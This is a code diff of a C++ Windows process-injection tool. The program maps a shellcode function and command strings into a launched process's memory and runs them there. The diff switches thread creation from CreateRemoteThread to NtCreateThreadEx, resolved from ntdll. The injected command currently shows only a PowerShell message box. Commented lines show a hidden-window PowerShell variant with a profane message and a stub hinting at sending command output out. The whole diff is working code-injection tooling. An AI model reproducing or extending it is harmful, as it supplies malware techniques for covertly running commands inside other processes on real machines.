@@ -279,6 +279,21 @@ namespace functions {
 
 };
 
+bool IsCorrectTargetArchitecture(HANDLE hProc);
+
+HANDLE openProcess(DWORD pid) {
+	HANDLE hProc = functions::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	if (IsCorrectTargetArchitecture(hProc)) {
+		return hProc;
+	}
+
+	std::string message = std::system_category().message(GetLastError());
+	printf("%s", message);
+
+	return NULL;
+}
+
+
 bool IsCorrectTargetArchitecture(HANDLE hProc) {
 	BOOL bTarget = FALSE;
 	if (!functions::IsWow64Process(hProc, &bTarget)) {
@@ -292,6 +307,20 @@ bool IsCorrectTargetArchitecture(HANDLE hProc) {
 
 	return (bTarget == bHost);
 }
+
+typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
+	OUT PHANDLE hThread,
+	IN ACCESS_MASK DesiredAccess,
+	IN PVOID ObjectAttributes,
+	IN HANDLE ProcessHandle,
+	IN PVOID lpStartAddress,
+	IN PVOID lpParameter,
+	IN ULONG Flags,
+	IN SIZE_T StackZeroBits,
+	IN SIZE_T SizeOfStackCommit,
+	IN SIZE_T SizeOfStackReserve,
+	OUT PVOID lpBytesBuffer
+	);
 
 using warp_GetProcAddress = FARPROC(WINAPI*)(HMODULE hModule, LPCSTR lpProcName);
 using warp_LoadLibraryA = HINSTANCE(WINAPI*)(const char* lpLibFilename);
@@ -327,6 +356,9 @@ struct mapping_data {
 #pragma runtime_checks( "", off )
 #pragma optimize( "", off )
 void Shellcode(mapping_data* data) {
+
+	//data->MessageBoxW_warpper(NULL, NULL, NULL, MB_OK);
+
 	HMODULE StdioCrtModule = data->LoadLibraryA_warpper((LPCSTR)data->LibChars);
 	if (StdioCrtModule == NULL) {
 		data->MessageBoxW_warpper(NULL, NULL, NULL, MB_OK);
@@ -359,14 +391,11 @@ void Shellcode(mapping_data* data) {
 	if ((pPipe = l_popen((LPCSTR)data->command, (LPCSTR)data->mode)) == NULL)
 		return;
 
-	lfgets(psBuffer, 128, pPipe);
-
 	/* Read pipe until end of file, or an error occurs. */
-	while (lfgets(psBuffer, 128, pPipe)) {
-	//	//send-buffer(psBuffer);
-		data->MessageBoxW_warpper(NULL, psBuffer, "command", MB_OK);
-
-	}
+	//while (lfgets(psBuffer, 128, pPipe)) {
+	////	//send-buffer(psBuffer);
+		//data->MessageBoxW_warpper(NULL, psBuffer, NULL, MB_OK);
+	//}
 
 	/* Close pipe and print return value of pPipe. */
 	//if (lfeof(pPipe)) {
@@ -376,7 +405,7 @@ void Shellcode(mapping_data* data) {
 	//}
 
 	data->FreeLibrary_warpper(StdioCrtModule);
-	data->MessageBoxW_warpper(NULL, (LPCSTR)data->LibChars, (LPCSTR)data->_popenChars, MB_OK);
+	//data->MessageBoxW_warpper(NULL, (LPCSTR)data->LibChars, (LPCSTR)data->_popenChars, MB_OK);
 }
 
 LPVOID RemoteAllocateMem_str(HANDLE hProc, const char* s) {
@@ -388,8 +417,30 @@ LPVOID RemoteAllocateMem_str(HANDLE hProc, const char* s) {
 	return NULL;
 }
 
+void showProcessInformation() {
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot) {
+		PROCESSENTRY32 pe32;
+		pe32.dwSize = sizeof(PROCESSENTRY32);
+		if (Process32First(hSnapshot, &pe32)) {
+			do {
+
+				char* MB = (char*)malloc(wcslen(pe32.szExeFile) + 1);
+				wcstombs(MB, pe32.szExeFile, wcslen(pe32.szExeFile) + 1);
+
+				printf("pid %d %s\n", pe32.th32ProcessID, MB);
+			} while (Process32Next(hSnapshot, &pe32));
+		}
+		CloseHandle(hSnapshot);
+	}
+}
+
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 {
+
+	//showProcessInformation();
+
+	//return 0;
 
 	functions::resolve_imports();
 
@@ -441,7 +492,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 	if (DEBUG)
 		printf("Process pid: %d\n", pi.dwProcessId);
 
-	HANDLE hProc = functions::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
+	HANDLE hProc = functions::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId); //openProcess(pi.dwProcessId); //GETPROO()
 
 	if (!hProc) {
 		DWORD Err = functions::GetLastError();
@@ -476,7 +527,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 	data.fgetsChars = RemoteAllocateMem_str(hProc, "fgets");
 	data.feofChars = RemoteAllocateMem_str(hProc, "feof");
 
-	data.command = RemoteAllocateMem_str(hProc, "dir");//"PowerShell -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Hello World')\"");
+	//data.command = RemoteAllocateMem_str(hProc, "PowerShell -NoProfile -WindowStyle Hidden -Command echo 'Hello, World! MotherFuckers'");
+	data.command = RemoteAllocateMem_str(hProc, "PowerShell -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Hello World')\"");
+	
 	data.mode = RemoteAllocateMem_str(hProc, "rt");
 
 	//allocate page (space) for data (mapping_data) and get its address to MappingDataAlloc
@@ -503,14 +556,36 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 	}
 
 	//execute your function
-	HANDLE shellcodeThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, MappingDataAlloc, 0, NULL);
+
+	HMODULE hKernel32 = GetModuleHandleA("Kernel32");
+	if (!hKernel32)
+		return 1;
+
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	if (!hNtdll)
+		return 1;
+
+	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
+
+	DWORD pid = pi.dwProcessId;
+	HANDLE ht; // thread handle
+	LPVOID rb; // remote buffer
+	SIZE_T rl; // return length
+
+	NtCreateThreadEx(&ht, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)pShellcode, MappingDataAlloc, FALSE, NULL, NULL, NULL, NULL);
+	if (ht) {
+		WaitForSingleObject(ht, INFINITE);
+		CloseHandle(ht);
+	}
+
+	/*HANDLE shellcodeThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, MappingDataAlloc, 0, NULL);
 	if (shellcodeThread) {
 		WaitForSingleObject(shellcodeThread, INFINITE);
 		CloseHandle(shellcodeThread);
-	}
+	}*/
 	
 	//cleanup process
-	//VirtualFreeEx(hProcess, pLibRemote, sizeof(szLibPath), MEM_RELEASE);
+	//free data members...
 	
 	//cleanup overall process, handlers, threads
 	TerminateProcess(hProc, 0);
